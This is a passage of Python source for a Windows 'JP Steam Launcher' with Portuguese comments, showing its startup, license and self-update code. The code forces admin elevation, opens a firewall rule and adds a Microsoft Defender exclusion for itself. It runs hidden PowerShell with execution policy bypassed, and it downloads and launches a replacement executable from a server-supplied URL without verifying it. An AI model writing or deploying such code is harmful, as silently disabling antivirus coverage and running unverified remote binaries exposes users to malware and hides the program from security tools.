    if not getattr(sys, "frozen", False):
        return None
    try:
        exe = sys.executable
        sha = hashlib.sha256()
        with open(exe, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha.update(chunk)
        return sha.hexdigest()
    except Exception:
        return None


def check_for_update():
    """Verifica se há atualização disponível. Retorna (needs_update, download_url) ou (False, None)."""
    try:
        ps_script = (
            f"try {{ "
            f"  $r = Invoke-RestMethod -Uri '{LICENSE_SERVER_URL}/api/launcher/version' -TimeoutSec 5; "
            f"  Write-Output $r.hash; "
            f"  Write-Output $r.download_url "
            f"}} catch {{ Write-Output 'ERR' }}"
        )
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True, text=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        lines = r.stdout.strip().split("\n")
        if len(lines) >= 2 and lines[0] != "ERR":
            server_hash = lines[0].strip()
            download_url = lines[1].strip()
            local_hash = _get_own_hash()
            if local_hash and server_hash and local_hash != server_hash:
                return True, download_url
        return False, None
    except Exception:
        return False, None


def _apply_pending_update():
    """No início da execução, aplica atualização pendente (.new) e limpa resíduos."""
    if not getattr(sys, "frozen", False):
        return
    try:
        exe_path = os.path.abspath(sys.executable)
        exe_dir = os.path.dirname(exe_path)
        new_path = exe_path + ".new"
        old_path = exe_path + ".old"

        # Limpa o .old residual de atualizações anteriores
        if os.path.exists(old_path):
            try:
                os.remove(old_path)
            except Exception:
                pass

        # Limpa o .bat de atualização se sobrou
        bat_path = os.path.join(exe_dir, "_jp_update.bat")
        if os.path.exists(bat_path):
            try:
                os.remove(bat_path)
            except Exception:
                pass

        # Aplica .new pendente (fallback caso o .bat não tenha funcionado)
        if os.path.exists(new_path) and os.path.getsize(new_path) > 10000:
            try:
                os.remove(exe_path)
            except Exception:
                pass
            os.rename(new_path, exe_path)
    except Exception:
        pass


def do_self_update(download_url):
    """Baixa o novo EXE como .new para ser aplicado na próxima execução."""
    if not getattr(sys, "frozen", False):
        return False
    try:
        exe_path = os.path.abspath(sys.executable)
        new_path = exe_path + ".new"

        ps_script = (
            f"try {{ "
            f"  Invoke-WebRequest -Uri '{download_url}' -OutFile '{new_path}' -UseBasicParsing -TimeoutSec 60; "
            f"  Write-Output 'OK' "
            f"}} catch {{ Write-Output 'ERR' }}"
        )
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True, text=True, timeout=90,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if "OK" not in r.stdout:
            return False
        if not os.path.exists(new_path) or os.path.getsize(new_path) < 10000:
            return False
        return True
    except Exception:
        return False


_update_splash = None

def _show_update_splash():
    """Mostra splash de atualização (não-bloqueante)."""
    global _update_splash
    try:
        ctk.set_appearance_mode("dark")
        splash = ctk.CTk()
        splash.title("JP Steam Launcher")
        splash.geometry("380x120")
        splash.resizable(False, False)
        splash.configure(fg_color=CORES["fundo_escuro"])
        splash.overrideredirect(True)
        splash.eval("tk::PlaceWindow . center")
        ctk.CTkLabel(splash, text="Atualizando JP Steam Launcher...",
                     font=ctk.CTkFont(size=15, weight="bold"),
                     text_color=CORES["texto"]).pack(pady=(28, 8))
        ctk.CTkLabel(splash, text="Baixando nova versão. Aguarde...",
                     font=ctk.CTkFont(size=12),
                     text_color=CORES["texto_secundario"]).pack()
        splash.update()
        _update_splash = splash
    except Exception:
        pass


def _close_update_splash():
    global _update_splash
    try:
        if _update_splash:
            _update_splash.destroy()
            _update_splash = None
    except Exception:
        pass


def _apply_update_and_restart():
    """Renomeia o exe atual para .old, renomeia .new para o original e relança."""
    try:
        exe_path = os.path.abspath(sys.executable)
        new_path = exe_path + ".new"
        old_path = exe_path + ".old"

        if not os.path.exists(new_path):
            return

        # Windows permite renomear um exe em execução
        if os.path.exists(old_path):
            try:
                os.remove(old_path)
            except Exception:
                pass

        os.rename(exe_path, old_path)
        os.rename(new_path, exe_path)

        # Lança o novo exe e sai
        subprocess.Popen(
            [exe_path] + sys.argv[1:],
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
        os._exit(0)
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(
            0,
            f"Erro ao aplicar atualização: {e}\nFeche o launcher e abra novamente.",
            "JP Steam Launcher",
            0x10,
        )


def main():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

    # 1. Libera firewall e adiciona exclusão no Defender (já é admin)
    add_firewall_rule()
    _add_defender_exclusion()

    # 2. Aplica atualização pendente (se foi baixada na execução anterior)
    _apply_pending_update()

    # 3. Auto-update: baixa nova versão e aplica automaticamente
    if getattr(sys, "frozen", False):
        try:
            needs_update, download_url = check_for_update()
            if needs_update and download_url:
                _show_update_splash()
                updated = do_self_update(download_url)
                _close_update_splash()
                if updated:
                    resp = ctypes.windll.user32.MessageBoxW(
                        0,
                        "Nova atualização disponível!\n\nClique OK para aplicar e reiniciar o launcher.",
                        "JP Steam Launcher - Atualização",
                        0x01 | 0x40,  # MB_OKCANCEL | MB_ICONINFORMATION
                    )
                    if resp == 1:  # IDOK
                        _apply_update_and_restart()
                    # Se cancelou, continua com a versão atual
        except Exception:
            _close_update_splash()

    # Pular validação (desenvolvimento): JP_SKIP_LICENSE=1
    if os.environ.get("JP_SKIP_LICENSE") == "1":
        app = LauncherApp()
        app.mainloop()
        return

    # 2. Se já tem key salva, valida via PowerShell
    stored = load_stored_key()
    if stored:
        hw_id = get_hardware_id()
        ok, msg = validate_license(stored, hw_id)
        if ok:
            app = LauncherApp()
            app.mainloop()
            return
        # Erro de conexão: confia na key local
        is_connection_error = any(x in msg.lower() for x in ["conexão", "connection", "10051", "10061", "timeout", "unreachable"])
        if is_connection_error:
            app = LauncherApp()
            app.mainloop()
            return

    # 3. Sem key: mostra tela de ativação (valida via PowerShell)
    if not _show_license_dialog():
        sys.exit(0)

    app = LauncherApp()
    app.mainloop()


if __name__ == "__main__":
    main()
